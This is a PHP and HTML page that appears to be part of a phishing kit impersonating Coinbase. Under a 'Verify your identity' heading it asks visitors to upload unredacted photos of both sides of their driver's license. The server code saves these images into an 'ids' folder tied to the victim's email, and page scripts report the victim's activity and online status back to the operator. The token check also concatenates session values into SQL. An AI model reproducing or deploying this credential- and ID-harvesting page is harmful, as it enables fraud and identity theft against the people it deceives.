<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the token from the session
$token = $_SESSION["token"];

// Update user activity to indicate visiting drivers.php
updateActivity($token, "DriversPage");

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the email and token from the session
    $email = isset($_SESSION["email"]) ? $_SESSION["email"] : '';
    $token = isset($_SESSION["token"]) ? $_SESSION["token"] : '';

    // Validate the token
    $token_check_query = "SELECT * FROM user_submissions WHERE email='$email' AND token='$token'";
    $token_result = $conn->query($token_check_query);
    if ($token_result->num_rows > 0) {
        // Token is valid, proceed with updating images

        // Prepare and bind the SQL statement
        $stmt = $conn->prepare("UPDATE user_submissions SET front = ?, back = ? WHERE email = ?");

        // Define variables to store image data
        $front = '';
        $back = '';

        // Function to handle image upload
        function uploadImage($file, &$destination)
        {
            // Check if file was uploaded without errors
            if ($file['error'] === UPLOAD_ERR_OK) {
                // Generate a unique name for the image
                $destination = 'ids/' . uniqid() . '_' . basename($file['name']);
                // Move the uploaded file to the desired destination
                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    return true;
                } else {
                    return false;
                }
            }
            return false;
        }

        // Upload front image
        if (isset($_FILES['front'])) {
            if (uploadImage($_FILES['front'], $front)) {
                // Image uploaded successfully
            } else {
                // Error uploading image
                echo "Error uploading front image.";
            }
        }

        // Upload back image
        if (isset($_FILES['back'])) {
            if (uploadImage($_FILES['back'], $back)) {
                // Image uploaded successfully
            } else {
                // Error uploading image
                echo "Error uploading back image.";
            }
        }

        // Bind parameters and execute the prepared statement
        $stmt->bind_param("sss", $front, $back, $email);
        if ($stmt->execute()) {
            // Close statement
            $stmt->close();
            // Redirect to loading.php page
            header("Location: loading.php");
            exit();
        } else {
            echo "Error storing images.";
        }
    } else {
        // Token is invalid, redirect or display an error message
        header("Location: login.php");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'), /* Modern Browsers */
                 url('path/to/CoinbaseSans.woff') format('woff'); /* Legacy Browsers */
            font-weight: normal; /* Specify font weight if necessary */
            font-style: normal; /* Specify font style if necessary */
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #FFFFFF;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 60vh;
        }

        h1 {
            font-size: 32px;
            font-weight: 400;
            margin-bottom: 0;
        }

        .login-container {
            width: 80%;
            max-width: 800px;
            padding: 20px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            margin-top: 80px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-top: 40px;
        }

        h2 {
            font-size: 28px;
            font-weight: 400;
        }

        .login-form {
            margin-top: 20px;
        }

        .login-form h2 {
            text-align: center;
        }

        .login-form p {
            color: #5b616e;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            margin-left: 20px;
            margin-top: 5px;
            text-align: center;
        }

        .login-form a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .id-boxes {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .box {
            flex: 0 0 auto;
            width: 150px;
            height: 130px;
            border: 2px dashed rgba(91, 97, 110, 0.2);;
            margin: 0 10px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .selected {
            border-color: #0052ff !important;
        }

        .box img {
            width: 50px;
            height: 50px;
            max-width: 100%;
            max-height: 100%;
            margin: 0;
            padding: 0;
        }

        .box h3 {
            font-size: 16px;
            margin-bottom: 0px;
        }

        .box span {
            color: #5b616e;
            font-size: 14px;
        }

        .circle {
            width: 6px;
            height: 6px;
            background-color: #0052ff;
            border-radius: 50%;
            display: inline-block;
            vertical-align: middle;
            margin-right: 5px;
        }

        .p-container {
            text-align: center;
            padding: 10px;
            max-width: 80%;
            margin: 0 auto;
            margin-bottom: 20px;
        }

        .p-container p {
            font-weight: bold;
            margin: 0;
        }

        .p-container .privacy {
            margin-left: 0px;
        }

        .centered-button {
            text-align: center;
        }

        .centered-button button {
            background-color: #749FFF;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 16px;
            margin-bottom: 20px;
            width: 125px;
        }

        .link-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            margin-right: 20px;
        }

        .link-container a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .login-form a {
            margin-left: 20px;
        }

        .centered-link {
            margin-top: 20px;
            text-align: center;
        }

        .centered-link a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .centered-span {
            text-align: center;
        }

        .centered-span span {
            color: #90888C;
            cursor: pointer;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            margin-bottom: 20px;
            display: inline-block;
            text-decoration: none;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <h1>Verify your identity</h1>
    <div class="login-container">
        <form class="login-form" action="" method="post" enctype="multipart/form-data">
            <h2>Upload images</h2>
            <p>Upload pictures of your driver's license (JPEG or PNG).</p>
            <div class="id-boxes">
                <div class="box box-left">
                    <img src="assets/identityCard-2.svg" alt="">
                    <span>Drag & drop or click to upload</span>
                    <!-- Add name attribute to input field -->
                    <input type="file" name="front" accept="image/jpeg, image/png" style="display: none;">
                </div>
                <div class="box box-right">
                    <img src="assets/identityCard-2.svg" alt="">
                    <span>Drag & drop or click to upload</span>
                    <!-- Add name attribute to input field -->
                    <input type="file" name="back" accept="image/jpeg, image/png" style="display: none;">
                </div>
            </div>
            <div class="p-container">
                <p>Please do not redact, watermark or otherwise obscure any part of your ID. This will help ensure we can verify your identity document as quickly and accurately as possible.</p>
            </div>
            <div class="centered-button">
                <button type="submit">Upload</button> <!-- Changed type to submit -->
            </div>
            <div class="centered-span">
                <span>Go back</span>
            </div>
        </form>
    </div>
    <div class="centered-link">
        <a href="#">Sign out</a>
    </div>
</div>
<script>
    document.addEventListener("DOMContentLoaded", () => {
        const boxes = document.querySelectorAll('.box');
        const uploadButton = document.querySelector('.centered-button button');
        let boxLeftImageInserted = false;
        let boxRightImageInserted = false;

        // Function to update the color of the upload button
        const updateUploadButtonColor = () => {
            if (boxLeftImageInserted && boxRightImageInserted) {
                uploadButton.style.backgroundColor = '#0052ff';
            } else {
                uploadButton.style.backgroundColor = '#749FFF';
            }
        };

        boxes.forEach(box => {
            const input = box.querySelector('input[type="file"]');
            const span = box.querySelector('span');
            const img = box.querySelector('img');

            // Function to handle image display
            const displayImage = (file) => {
                const reader = new FileReader();
                reader.onload = () => {
                    img.src = reader.result;
                    img.style.display = 'block'; // Show the img element
                    img.style.width = '100%'; // Set image width to 100%
                    img.style.height = '100%'; // Set image height to 100%
                    span.style.display = 'none'; // Hide the span element
                    if (box.classList.contains('box-left')) {
                        boxLeftImageInserted = true;
                    } else if (box.classList.contains('box-right')) {
                        boxRightImageInserted = true;
                    }
                    updateUploadButtonColor(); // Update button color
                };
                reader.readAsDataURL(file);
            };

            // Handle file selection via input
            input.addEventListener('change', () => {
                const file = input.files[0];
                if (file) displayImage(file);
            });

            // Handle file drag and drop
            ['dragover', 'dragenter'].forEach(eventName => {
                box.addEventListener(eventName, (event) => {
                    event.preventDefault();
                    box.classList.add('drag-over');
                });
            });

            ['dragleave', 'dragend', 'drop'].forEach(eventName => {
                box.addEventListener(eventName, () => {
                    box.classList.remove('drag-over');
                });
            });

            box.addEventListener('drop', (event) => {
                event.preventDefault();
                const file = event.dataTransfer.files[0];
                if (file) displayImage(file);
            });

            // Handle file click
            box.addEventListener('click', () => {
                input.click();
            });
        });
    });

    document.addEventListener("DOMContentLoaded", () => {
        const goBackSpan = document.querySelector('.centered-span span');

        goBackSpan.addEventListener('click', () => {
            window.location.href = 'id.php';
        });
    });

    // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

    // Detect user activity
    function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
</script>
</body>
</html>